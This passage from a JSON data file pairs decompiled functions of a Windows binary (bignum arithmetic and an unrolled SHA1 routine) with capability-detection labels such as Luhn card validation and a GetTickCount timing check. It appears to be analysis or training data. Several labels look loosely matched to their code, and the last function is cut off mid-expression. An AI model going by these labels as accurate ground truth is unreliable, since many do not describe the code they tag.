        "decompiled_code": "\nuint __cdecl fcn.0040702c(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_110h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x100);\n    fcn.00401293(&var_110h, 0, 0xfa);\n    fcn.0040126d(&var_110h, in_ECX, in_EDX);\n    var_4h = &var_110h;\n    var_ch = arg_ch;\n    var_8h = uVar1;\n    fcn.004024bb(arg_8h);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 207
    },
    "004070ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004070ea(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint arg_8h_00;\n    int32_t iVar4;\n    uint extraout_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004073bd();\n    fcn.00407d57();\n    uVar2 = fcn.00401000(4);\n    *(in_ECX + 0x30) = uVar2;\n    uVar2 = fcn.00407d2d();\n    **(in_ECX + 0x30) = uVar2;\n    *(in_ECX + 0x34) = 1;\n    fcn.00407dae();\n    iVar6 = 0;\n    do {\n        iVar3 = fcn.00407384();\n        if (iVar3 == 0) {\n            fcn.00407dc4();\n            var_ch = extraout_ECX;\n        }\n        else {\n            iVar3 = 0;\n            var_ch = 0;\n            if (iVar1 < 0) {\n                iVar5 = 0;\n            }\n            else {\n                iVar3 = fcn.00407384();\n                iVar5 = iVar1;\n                while (iVar3 == 0) {\n                    iVar5 = iVar5 + 1;\n                    iVar3 = fcn.00407384();\n                }\n                if (iVar1 < iVar5) {\n                    iVar3 = 0;\n                }\n                else {\n                    do {\n                        fcn.00407dc4();\n                        fcn.00407512(arg_8h_00, 0, 0);\n                        fcn.0040726f();\n                        iVar3 = fcn.00407384();\n                        iVar4 = var_ch + 1;\n                        if (iVar3 == 0) {\n                            iVar4 = var_ch;\n                        }\n                        iVar3 = iVar4 * 2;\n                        if (iVar1 == iVar5) {\n                            iVar3 = iVar4;\n                        }\n                        iVar1 = iVar1 + -1;\n                        var_ch = iVar3;\n                    } while (iVar5 <= iVar1);\n                }\n            }\n            iVar1 = iVar3 + -1;\n            if (iVar3 + -1 < 0) {\n                iVar1 = iVar3;\n            }\n            var_ch = *(*(in_ECX + 0x30) + (iVar1 >> 1) * 4);\n            iVar1 = iVar5;\n        }\n        iVar1 = iVar1 + -1;\n        fcn.00407512(var_ch, 0, 0);\n        uVar2 = fcn.0040726f();\n    } while (-1 < iVar1);\n    if (0 < *(in_ECX + 0x34)) {\n        do {\n            fcn.00407d95();\n            fcn.00407d69();\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < *(in_ECX + 0x34));\n    }\n    fcn.00401014(*(in_ECX + 0x30));\n    fcn.00407d69();\n    return uVar2;\n}\n",
        "token_count": 741
    },
    "0040726f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040726f(int32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(param_1 + 0x40);\n    arg_8h = *(param_1 + 0xc + uVar1 * 4);\n    iVar3 = *(arg_8h + 4);\n    if (iVar3 * 2 < *(param_2 + 4)) {\n        uVar2 = fcn.004078a0(arg_8h, 1);\n    }\n    else {\n        fcn.00407d2d();\n        fcn.00407804();\n        fcn.00407512(*(param_1 + 0x18 + uVar1 * 4), 0, iVar3 + -1);\n        fcn.00407804();\n        fcn.0040734c();\n        fcn.00407512(arg_8h, iVar3 + 1, 0);\n        uVar2 = fcn.0040734c();\n        uVar2 = fcn.00407c27(uVar2, 0);\n        iVar3 = fcn.004074b0();\n        if (-1 < iVar3) {\n            uVar2 = fcn.00407c27(arg_8h, 0);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 349
    },
    "00407458": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407458(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(param_1 + 6) < param_2) {\n        iVar3 = *(param_1 + 6) * 2;\n        iVar2 = param_2;\n        if (param_2 < iVar3) {\n            iVar2 = iVar3;\n        }\n        *(param_1 + 6) = iVar2;\n        uVar1 = fcn.00401050(*(param_1 + 0xc), iVar2 << 2);\n        *(param_1 + 0xc) = uVar1;\n    }\n    iVar3 = *(param_1 + 4);\n    if (iVar3 < param_2) {\n        fcn.00401293(*(param_1 + 0xc) + iVar3 * 4, 0, (param_2 - iVar3) * 4);\n    }\n    *(param_1 + 4) = param_2;\n    return;\n}\n",
        "token_count": 243
    },
    "004074fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004074fc(uint arg_8h)\n\n{\n    fcn.00407512(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "004077b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004077b4(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    iVar4 = *(param_1 + 4) + -1;\n    if (0 < param_2) {\n        fcn.00407458();\n        puVar3 = *(param_1 + 0xc) + (iVar4 + param_2) * 4;\n        puVar2 = *(param_1 + 0xc) + iVar4 * 4;\n        do {\n            uVar1 = *puVar2;\n            puVar2 = puVar2 + -1;\n            *puVar3 = uVar1;\n            puVar3 = puVar3 + -1;\n            bVar5 = iVar4 != 0;\n            iVar4 = iVar4 + -1;\n        } while (bVar5);\n        fcn.00401293(*(param_1 + 0xc), 0, param_2 << 2);\n    }\n    return param_1;\n}\n",
        "token_count": 255
    },
    "0040783e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040783e(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    \n    var_14h = 0;\n    iVar3 = *(in_EDX + 4) + -1;\n    do {\n        iVar1 = *(in_EDX + 0xc);\n        uVar2 = fcn.00401140(*(iVar1 + iVar3 * 4), var_14h, arg_8h, 0);\n        *(iVar1 + iVar3 * 4) = uVar2;\n        var_14h = fcn.004011b0();\n        iVar3 = iVar3 + -1;\n    } while (-1 < iVar3);\n    fcn.0040735b();\n    return;\n}\n",
        "token_count": 205
    },
    "00407ba2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407ba2(uint32_t arg_8h)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t in_EDX;\n    uint32_t uVar8;\n    uint32_t *puVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EDX + 4);\n    iVar4 = fcn.004073ef();\n    uVar8 = 0;\n    puVar9 = *(iVar4 + 0xc);\n    iVar4 = *(in_EDX + 0xc);\n    fcn.00401293(puVar9, 0, iVar1 * 4 + 4);\n    iVar7 = 0;\n    do {\n        iVar3 = arg_8h * *(iVar4 + iVar7 * 4);\n        uVar5 = iVar3;\n        uVar6 = uVar5 + uVar8;\n        uVar2 = *puVar9;\n        *puVar9 = *puVar9 + uVar6;\n        puVar9 = puVar9 + 1;\n        uVar8 = (iVar3 >> 0x20) + CARRY4(uVar5, uVar8) + CARRY4(uVar2, uVar6);\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < iVar1);\n    *puVar9 = uVar8;\n    fcn.00407d69();\n    fcn.0040735b();\n    return;\n}\n",
        "token_count": 396
    },
    "00407ca5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407ca5(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_EDX;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint32_t *puVar7;\n    int32_t iVar8;\n    uint var_ch;\n    uint var_4h;\n    \n    uVar6 = 0;\n    iVar2 = *(in_EDX + 4);\n    if (*(in_EDX + 4) <= *(arg_8h + 4)) {\n        iVar2 = *(arg_8h + 4);\n    }\n    iVar8 = iVar2;\n    fcn.00407458();\n    fcn.00407458();\n    puVar7 = *(in_EDX + 0xc);\n    piVar5 = *(arg_8h + 0xc);\n    do {\n        iVar3 = *piVar5;\n        piVar5 = piVar5 + 1;\n        uVar4 = iVar3 + *puVar7;\n        uVar1 = *puVar7;\n        *puVar7 = uVar4 + uVar6;\n        puVar7 = puVar7 + 1;\n        uVar6 = uVar4 < uVar1 || uVar4 + uVar6 < uVar4;\n        iVar8 = iVar8 + -1;\n    } while (iVar8 != 0);\n    *puVar7 = uVar6;\n    fcn.00407d69();\n    fcn.0040735b();\n    return;\n}\n",
        "token_count": 362
    },
    "00407d2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00407d2d(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004073ef();\n    fcn.0040126d(*(iVar1 + 0xc), *(param_2 + 0xc), *(param_2 + 4) << 2);\n    return iVar1;\n}\n",
        "token_count": 89
    },
    "0040847a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using SHA1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040847a(uint32_t *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint *puVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint32_t uVar26;\n    uint32_t uVar27;\n    uint32_t var_9ch;\n    uint32_t var_98h;\n    uint32_t var_94h;\n    uint32_t var_90h;\n    uint32_t var_8ch;\n    uint32_t var_88h;\n    uint32_t var_84h;\n    uint32_t var_80h;\n    uint32_t var_7ch;\n    uint32_t var_78h;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint32_t var_6ch;\n    uint32_t var_68h;\n    uint32_t var_64h;\n    uint32_t var_60h;\n    uint32_t *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar12 = param_1[1];\n    puVar20 = &var_9ch;\n    var_5ch = param_1;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar20 = *param_2;\n        param_2 = param_2 + 1;\n        puVar20 = puVar20 + 1;\n    }\n    uVar13 = *param_1;\n    uVar11 = var_9ch >> 8 & 0xff00ff00 | var_9ch << 0x18 | (var_9ch & 0xff00) << 8 | var_9ch >> 0x18;\n    uVar9 = uVar12 >> 2 | uVar12 << 0x1e;\n    uVar12 = uVar11 + 0x5a827999 +\n             ((var_5ch[3] ^ var_5ch[2]) & uVar12 ^ var_5ch[3]) + (uVar13 << 5 | uVar13 >> 0x1b) + var_5ch[4];\n    uVar16 = var_98h >> 8 & 0xff00ff00 | var_98h << 0x18 | (var_98h & 0xff00) << 8 | var_98h >> 0x18;\n    uVar21 = uVar13 >> 2 | uVar13 << 0x1e;\n    uVar17 = var_5ch[3] + 0x5a827999 +\n             ((var_5ch[2] ^ uVar9) & uVar13 ^ var_5ch[2]) + (uVar12 * 0x20 | uVar12 >> 0x1b) + uVar16;\n    uVar2 = var_94h >> 8 & 0xff00ff00 | var_94h << 0x18 | (var_94h & 0xff00) << 8 | var_94h >> 0x18;\n    uVar22 = var_5ch[2] + 0x5a827999 + ((uVar9 ^ uVar21) & uVar12 ^ uVar9) + (uVar17 * 0x20 | uVar17 >> 0x1b) + uVar2;\n    uVar13 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar3 = var_90h >> 8 & 0xff00ff00 | var_90h << 0x18 | (var_90h & 0xff00) << 8 | var_90h >> 0x18;\n    uVar18 = uVar17 >> 2 | uVar17 * 0x40000000;\n    uVar12 = uVar9 + 0x5a827999 + ((uVar13 ^ uVar21) & uVar17 ^ uVar21) + (uVar22 * 0x20 | uVar22 >> 0x1b) + uVar3;\n    uVar4 = var_8ch >> 8 & 0xff00ff00 | var_8ch << 0x18 | (var_8ch & 0xff00) << 8 | var_8ch >> 0x18;\n    uVar23 = uVar22 >> 2 | uVar22 * 0x40000000;\n    uVar17 = (uVar13 ^ (uVar13 ^ uVar18) & uVar22) + (uVar12 * 0x20 | uVar12 >> 0x1b) + uVar4 + uVar21 + 0x5a827999;\n    uVar9 = var_88h >> 8 & 0xff00ff00 | var_88h << 0x18 | (var_88h & 0xff00) << 8 | var_88h >> 0x18;\n    uVar21 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar13 = uVar13 + 0x5a827999 + ((uVar18 ^ uVar23) & uVar12 ^ uVar18) + (uVar17 * 0x20 | uVar17 >> 0x1b) + uVar9;\n    uVar12 = var_84h >> 8 & 0xff00ff00 | var_84h << 0x18 | (var_84h & 0xff00) << 8 | var_84h >> 0x18;\n    uVar14 = uVar17 >> 2 | uVar17 * 0x40000000;\n    uVar18 = (uVar13 * 0x20 | uVar13 >> 0x1b) + uVar12 + ((uVar23 ^ uVar21) & uVar17 ^ uVar23) + uVar18 + 0x5a827999;\n    uVar17 = var_80h >> 8 & 0xff00ff00 | var_80h << 0x18 | (var_80h & 0xff00) << 8 | var_80h >> 0x18;\n    uVar19 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar13 = (uVar18 * 0x20 | uVar18 >> 0x1b) + uVar17 + ((uVar21 ^ uVar14) & uVar13 ^ uVar21) + uVar23 + 0x5a827999;\n    uVar24 = var_7ch >> 8 & 0xff00ff00 | var_7ch << 0x18 | (var_7ch & 0xff00) << 8 | var_7ch >> 0x18;\n    uVar25 = uVar18 >> 2 | uVar18 * 0x40000000;\n    uVar18 = (uVar13 * 0x20 | uVar13 >> 0x1b) + uVar24 + ((uVar19 ^ uVar14) & uVar18 ^ uVar14) + uVar21 + 0x5a827999;\n    uVar10 = var_78h >> 8 & 0xff00ff00 | var_78h << 0x18 | (var_78h & 0xff00) << 8 | var_78h >> 0x18;\n    uVar22 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar21 = (uVar18 * 0x20 | uVar18 >> 0x1b) + uVar10 + ((uVar19 ^ uVar25) & uVar13 ^ uVar19) + uVar14 + 0x5a827999;\n    uVar15 = var_74h >> 8 & 0xff00ff00 | var_74h << 0x18 | (var_74h & 0xff00) << 8 | var_74h >> 0x18;\n    uVar14 = uVar18 >> 2 | uVar18 * 0x40000000;\n    uVar23 = uVar19 + 0x5a827999 + ((uVar25 ^ uVar22) & uVar18 ^ uVar25) + (uVar21 * 0x20 | uVar21 >> 0x1b) + uVar15;\n    uVar13 = uVar23 >> 2 | uVar23 * 0x40000000;\n    uVar19 = var_70h >> 8 & 0xff00ff00 | var_70h << 0x18 | (var_70h & 0xff00) << 8 | var_70h >> 0x18;\n    uVar18 = (uVar22 ^ (uVar22 ^ uVar14) & uVar21) + (uVar23 * 0x20 | uVar23 >> 0x1b) + uVar19 + uVar25 + 0x5a827999;\n    uVar25 = uVar21 >> 2 | uVar21 * 0x40000000;\n    uVar5 = var_6ch >> 8 & 0xff00ff00 | var_6ch << 0x18 | (var_6ch & 0xff00) << 8 | var_6ch >> 0x18;\n    uVar21 = (uVar23 & (uVar14 ^ uVar25) ^ uVar14) + (uVar18 * 0x20 | uVar18 >> 0x1b) + uVar5 + uVar22 + 0x5a827999;\n    uVar6 = var_68h >> 8 & 0xff00ff00 | var_68h << 0x18 | (var_68h & 0xff00) << 8 | var_68h >> 0x18;\n    uVar22 = uVar18 >> 2 | uVar18 * 0x40000000;\n    uVar26 = (uVar25 ^ (uVar13 ^ uVar25) & uVar18) + (uVar21 * 0x20 | uVar21 >> 0x1b) + uVar6 + uVar14 + 0x5a827999;\n    uVar7 = var_64h >> 8 & 0xff00ff00 | var_64h << 0x18 | (var_64h & 0xff00) << 8 | var_64h >> 0x18;\n    uVar23 = uVar21 >> 2 | uVar21 * 0x40000000;\n    uVar14 = (uVar13 ^ (uVar13 ^ uVar22) & uVar21) + (uVar26 * 0x20 | uVar26 >> 0x1b) + uVar7 + uVar25 + 0x5a827999;\n    uVar8 = var_60h >> 8 & 0xff00ff00 | var_60h << 0x18 | (var_60h & 0xff00) << 8 | var_60h >> 0x18;\n    uVar11 = uVar6 ^ uVar24 ^ uVar2 ^ uVar11;\n    uVar18 = uVar11 << 1 | uVar11 < 0;\n    uVar13 = (uVar22 ^ (uVar22 ^ uVar23) & uVar26) + (uVar14 * 0x20 | uVar14 >> 0x1b) + uVar8 + uVar13 + 0x5a827999;\n    uVar27 = uVar26 >> 2 | uVar26 * 0x40000000;\n    uVar16 = uVar7 ^ uVar10 ^ uVar3 ^ uVar16;\n    uVar21 = uVar16 << 1 | uVar16 < 0;\n    uVar25 = (uVar23 ^ (uVar23 ^ uVar27) & uVar14) + (uVar13 * 0x20 | uVar13 >> 0x1b) + uVar18 + uVar22 + 0x5a827999;\n    uVar16 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar2 = uVar8 ^ uVar15 ^ uVar4 ^ uVar2;\n    uVar22 = uVar2 << 1 | uVar2 < 0;\n    uVar23 = (uVar27 ^ (uVar27 ^ uVar16) & uVar13) + (uVar25 * 0x20 | uVar25 >> 0x1b) + uVar21 + uVar23 + 0x5a827999;\n    uVar11 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar26 = uVar25 >> 2 | uVar25 * 0x40000000;\n    uVar13 = uVar19 ^ uVar9 ^ uVar3 ^ uVar18;\n    uVar2 = (uVar16 ^ (uVar11 ^ uVar16) & uVar25) + (uVar23 * 0x20 | uVar23 >> 0x1b) + uVar22 + uVar27 + 0x5a827999;\n    uVar14 = uVar13 << 1 | uVar13 < 0;\n    uVar27 = uVar23 >> 2 | uVar23 * 0x40000000;\n    uVar13 = uVar5 ^ uVar12 ^ uVar4 ^ uVar21;\n    uVar13 = uVar13 << 1 | uVar13 < 0;\n    uVar16 = (uVar11 ^ (uVar11 ^ uVar26) & uVar23) + (uVar2 * 0x20 | uVar2 >> 0x1b) + uVar14 + uVar16 + 0x5a827999;\n    uVar3 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar9 = uVar6 ^ uVar17 ^ uVar22 ^ uVar9;\n    uVar23 = uVar9 << 1 | uVar9 < 0;\n    uVar2 = (uVar26 ^ uVar27 ^ uVar2) + (uVar16 * 0x20 | uVar16 >> 0x1b) + uVar13 + uVar11 + 0x6ed9eba1;\n    uVar11 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar12 = uVar7 ^ uVar24 ^ uVar14 ^ uVar12;\n    uVar25 = uVar12 << 1 | uVar12 < 0;\n    uVar12 = (uVar27 ^ uVar3 ^ uVar16) + (uVar2 * 0x20 | uVar2 >> 0x1b) + uVar23 + uVar26 + 0x6ed9eba1;\n    uVar9 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar17 = uVar8 ^ uVar13 ^ uVar10 ^ uVar17;\n    uVar26 = uVar17 << 1 | uVar17 < 0;\n    uVar2 = (uVar3 ^ uVar2 ^ uVar11) + (uVar12 * 0x20 | uVar12 >> 0x1b) + uVar25 + uVar27 + 0x6ed9eba1;\n    uVar16 = uVar3 + 0x6ed9eba1 + (uVar9 ^ uVar12 ^ uVar11) + (uVar2 * 0x20 | uVar2 >> 0x1b) + uVar26;\n    uVar3 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar12 = uVar23 ^ uVar15 ^ uVar24 ^ uVar18;\n    uVar12 = uVar12 << 1 | uVar12 < 0;\n    uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = (uVar16 * 0x20 | uVar16 >> 0x1b) + uVar12 + (uVar9 ^ uVar3 ^ uVar2) + uVar11 + 0x6ed9eba1;\n    uVar11 = uVar25 ^ uVar19 ^ uVar10 ^ uVar21;\n    uVar11 = uVar11 << 1 | uVar11 < 0;\n    uVar17 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar9 = (uVar2 * 0x20 | uVar2 >> 0x1b) + uVar11 + (uVar3 ^ uVar4 ^ uVar16) + uVar9 + 0x6ed9eba1;\n    uVar16 = uVar26 ^ uVar5 ^ uVar15 ^ uVar22;\n    uVar16 = uVar16 << 1 | uVar16 < 0;\n    uVar15 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar3 = (uVar9 * 0x20 | uVar9 >> 0x1b) + uVar16 + (uVar4 ^ uVar17 ^ uVar2) + uVar3 + 0x6ed9eba1;\n    uVar2 = uVar12 ^ uVar6 ^ uVar19 ^ uVar14;\n    uVar2 = uVar2 << 1 | uVar2 < 0;\n    uVar24 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar4 = (uVar3 * 0x20 | uVar3 >> 0x1b) + uVar2 + (uVar9 ^ uVar17 ^ uVar15) + uVar4 + 0x6ed9eba1;\n    uVar9 = uVar11 ^ uVar7 ^ uVar5 ^ uVar13;\n    uVar9 = uVar9 << 1 | uVar9 < 0;\n    uVar19 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar9 + (uVar24 ^ uVar3 ^ uVar15) + uVar17 + 0x6ed9eba1;\n    uVar17 = uVar16 ^ uVar8 ^ uVar6 ^ uVar23;\n    uVar17 = uVar17 << 1 | uVar17 < 0;\n    uVar10 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar6 = uVar4 >> 2 | uVar4 * 0x40000000;\n    uVar5 = (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar17 + (uVar24 ^ uVar10 ^ uVar4) + uVar15 + 0x6ed9eba1;\n    uVar3 = uVar2 ^ uVar25 ^ uVar7 ^ uVar18;\n    uVar3 = uVar3 << 1 | uVar3 < 0;\n    uVar15 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar19 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar3 + (uVar10 ^ uVar6 ^ uVar19) + uVar24 + 0x6ed9eba1;\n    uVar4 = uVar9 ^ uVar26 ^ uVar8 ^ uVar21;\n    uVar4 = uVar4 << 1 | uVar4 < 0;\n    uVar24 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar4 + (uVar6 ^ uVar15 ^ uVar5) + uVar10 + 0x6ed9eba1;\n    uVar18 = uVar17 ^ uVar12 ^ uVar22 ^ uVar18;\n    uVar18 = uVar18 << 1 | uVar18 < 0;\n    uVar8 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar19 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar18 + (uVar19 ^ uVar15 ^ uVar24) + uVar6 + 0x6ed9eba1;\n    uVar21 = uVar3 ^ uVar11 ^ uVar14 ^ uVar21;\n    uVar21 = uVar21 << 1 | uVar21 < 0;\n    uVar7 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar21 + (uVar8 ^ uVar5 ^ uVar24) + uVar15 + 0x6ed9eba1;\n    uVar22 = uVar4 ^ uVar16 ^ uVar13 ^ uVar22;\n    uVar22 = uVar22 << 1 | uVar22 < 0;\n    uVar10 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar6 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar22 + (uVar8 ^ uVar7 ^ uVar19) + uVar24 + 0x6ed9eba1;\n    uVar14 = uVar18 ^ uVar2 ^ uVar23 ^ uVar14;\n    uVar14 = uVar14 << 1 | uVar14 < 0;\n    uVar24 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar19 = (uVar7 ^ uVar10 ^ uVar5) + (uVar6 * 0x20 | uVar6 >> 0x1b) + uVar14 + uVar8 + 0x6ed9eba1;\n    uVar13 = uVar21 ^ uVar9 ^ uVar25 ^ uVar13;\n    uVar15 = uVar13 << 1 | uVar13 < 0;\n    uVar8 = uVar6 >> 2 | uVar6 * 0x40000000;\n    uVar5 = (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar15 + (uVar10 ^ uVar24 ^ uVar6) + uVar7 + 0x6ed9eba1;\n    uVar23 = uVar22 ^ uVar17 ^ uVar26 ^ uVar23;\n    uVar13 = uVar23 << 1 | uVar23 < 0;\n    uVar7 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar6 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar13 + (uVar19 ^ uVar24 ^ uVar8) + uVar10 + 0x6ed9eba1;\n    uVar25 = uVar14 ^ uVar3 ^ uVar12 ^ uVar25;\n    uVar19 = uVar25 << 1 | uVar25 < 0;\n    uVar10 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar25 = (uVar6 * 0x20 | uVar6 >> 0x1b) + uVar19 + (uVar7 ^ uVar5 ^ uVar8) + uVar24 + 0x6ed9eba1;\n    uVar26 = uVar15 ^ uVar4 ^ uVar11 ^ uVar26;\n    uVar23 = uVar26 << 1 | uVar26 < 0;\n    uVar24 = uVar6 >> 2 | uVar6 * 0x40000000;\n    uVar6 = (uVar7 ^ uVar10 ^ uVar6) + (uVar25 * 0x20 | uVar25 >> 0x1b) + uVar23 + uVar8 + 0x6ed9eba1;\n    uVar12 = uVar13 ^ uVar18 ^ uVar16 ^ uVar12;\n    uVar26 = uVar12 << 1 | uVar12 < 0;\n    uVar8 = uVar25 >> 2 | uVar25 * 0x40000000;\n    uVar12 = (uVar6 * 0x20 | uVar6 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar24 | uVar25) & uVar10 | uVar24 & uVar25) + uVar26 + uVar7;\n    uVar11 = uVar19 ^ uVar21 ^ uVar2 ^ uVar11;\n    uVar25 = uVar11 << 1 | uVar11 < 0;\n    uVar11 = (uVar12 * 0x20 | uVar12 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar8 | uVar6) & uVar24 | uVar8 & uVar6) + uVar25 + uVar10;\n    uVar16 = uVar23 ^ uVar22 ^ uVar9 ^ uVar16;\n    uVar5 = uVar16 << 1 | uVar16 < 0;\n    uVar6 = uVar6 >> 2 | uVar6 * 0x40000000;\n    uVar2 = uVar26 ^ uVar14 ^ uVar17 ^ uVar2;\n    uVar2 = uVar2 << 1 | uVar2 < 0;\n    uVar16 = (uVar12 & uVar6 | (uVar12 | uVar6) & uVar8) + uVar5 + uVar24 + 0x8f1bbcdc +\n             (uVar11 * 0x20 | uVar11 >> 0x1b);\n    uVar7 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar12 = (uVar16 * 0x20 | uVar16 >> 0x1b) + 0x8f1bbcdc + ((uVar7 | uVar11) & uVar6 | uVar7 & uVar11) + uVar2 + uVar8\n    ;\n    uVar8 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar9 = uVar25 ^ uVar15 ^ uVar3 ^ uVar9;\n    uVar9 = uVar9 << 1 | uVar9 < 0;\n    uVar11 = (uVar12 * 0x20 | uVar12 >> 0x1b) + 0x8f1bbcdc + ((uVar8 | uVar16) & uVar7 | uVar8 & uVar16) + uVar9 + uVar6\n    ;\n    uVar17 = uVar5 ^ uVar13 ^ uVar4 ^ uVar17;\n    uVar6 = uVar17 << 1 | uVar17 < 0;\n    uVar24 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar27 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar12 = (uVar11 * 0x20 | uVar11 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar24 | uVar12) & uVar8 